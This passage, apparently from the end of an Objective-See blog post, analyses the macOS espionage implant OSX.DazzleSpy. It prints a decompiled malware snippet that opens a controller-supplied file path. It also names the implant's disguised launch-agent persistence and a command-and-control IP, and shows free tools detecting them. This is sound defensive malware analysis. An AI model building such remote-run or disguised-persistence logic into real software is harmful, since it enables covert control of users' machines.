<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">if</span> (YES <span style="color:#f92672">==</span> [command isEqualToString:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;run&#34;</span>]) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    path <span style="color:#f92672">=</span> [var_888 objectForKeyedSubscript:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;path&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    [NSWorkspace.sharedWorkspace openFile:path];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>}</span></span></code></pre></div>
<h3 id="dazzlespy-vs-objective-see"><code>DazzleSpy</code> vs. Objective-See</h3>
<p>Whenever a new piece of malware is uncovered I like to see how Objective-See&rsquo;s <a href="https://objective-see.com/products.html">free open-source tools</a> stack up.</p>
<p>Good news (and no really no surprise) they are able to detect and thus thwart this new threat, even with no a priori knowledge of it! 😍</p>
<div class="note">
Recall that when the malware was uploaded to VirusTotal (by ESET?), ESET was the only AV engine to detect it!
</div>
<p>First, <a href="https://objective-see.com/products/blockblock.html">BlockBlock</a> detects the malware&rsquo;s  launch agent persistence (<code>com.apple.softwareupdate.plist</code>):</p>
<img src="../images/blog/blog_0x6D/bb.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">BlockBlock alert</center>

<p><a href="https://objective-see.com/products/lulu.html">LuLu</a>, our free, open-source firewall detects when the malware attempts to connect out to its command and control server (<code>88.218.192.128</code>) for tasking:</p>
<img src="../images/blog/blog_0x6D/ll.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">LuLu alert</center>

<p>And if you&rsquo;re worried that you are already infected, <a href="https://objective-see.com/products/knockknock.html">KnockKnock</a> can uncover the malware&rsquo;s persistence (after the fact):</p>
<img src="../images/blog/blog_0x6D/kk.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">KnockKnock detection</center>

<h3 id="conclusions">Conclusions</h3>
<p>In this blog post, we dove into <code>OSX.DazzleSpy</code> a rather feature complete cyber-espionage macOS implant (discovered by ESET).</p>
<p>Specifically we discussed:</p>
<ul>
<li>How to triage the sample</li>
<li>How the malware persisted</li>
<li>The malware&rsquo;s remote tasking/capabilities.</li>
</ul>
<p>Finally, we showed that if you were running Objective-See&rsquo;s free macOS tools the malware wouldn&rsquo;t have stood a chance! 😁</p>
<div class="note">
Mahalo again to Marc-Etienne and Anton for their excellent report! 🙏🏽
</div>
<h3 id="-support-me">💕 Support Me:</h3>
<div style="border: 1px solid #DCDCDC; border-radius:7px; padding: 10px; margin-top:15px; margin-bottom: 15px;">
    <center>Love these blog posts? You can support them via my <a href="https://www.patreon.com/bePatron?c=701171" class="inlineLink">Patreon</a> page!
    <br><br>
    <a href="https://www.patreon.com/bePatron?c=701171" style="text-decoration: none;">
      <img src="../images/patreon.png" style="display:block;margin:auto; padding-top:0px; width:100%"/>
    </a>
    </center>
</div>
</section>

    </div>

    
<script src="/js/cookies.js"></script>
<script src="/social/ss-social.js"></script>
<link href="/social/ss-social.css" rel="stylesheet" />

<script> 
    $(function(){
        
        
        
        if("" == getCookie("acceptedCookies")) 
        {
            console.log('ok showing!')

            document.getElementById("cookies").style.display = "block";
        }

    });
</script>

<script>
function acceptCookies() {

    
    setCookie("acceptedCookies", "yes", 365);

    
    document.getElementById("cookies").style.display = "none";
}
</script>

<br>
<br>
<div id="cookies" class="cookie" style="padding-left:20px;">
    This website uses cookies to improve your experience.
    <div class="cookieButton">
        
        <button class="menuicon button-4" role="button" onclick="acceptCookies()" style="margin-top: 12px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Okay!</button>
    </div>
</div>
<nav role="footer">
<ul>

    <li>
        <a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#x2709;</span></a>
    </li>

     <li>
        <a href="rss.xml" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xE310;</span></a>
    </li>

    <li>
        <a href="https://www.youtube.com/channel/UCQycc8VDhHuNkZlKSSTDHzw" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xF630;</span></a>
    </li>
   
    <li>
        <a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon">&#xF611;</span></a>
    </li>
    
    <li>
         <form action="support.html" style="display: inline;">
            <button class="menuicon button-4" role="button" style="margin-top: 7px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Support Us!</button>
        </form>
        
    </li>

    <li>
        <div style="margin-top: 10px;">
        Signup for our <a class="inlineLink" target="_blank" href="http://eepurl.com/bXpXeT">newsletter </a> »
        </div>
    </li>

</ul>
</nav>

  </body>
</html>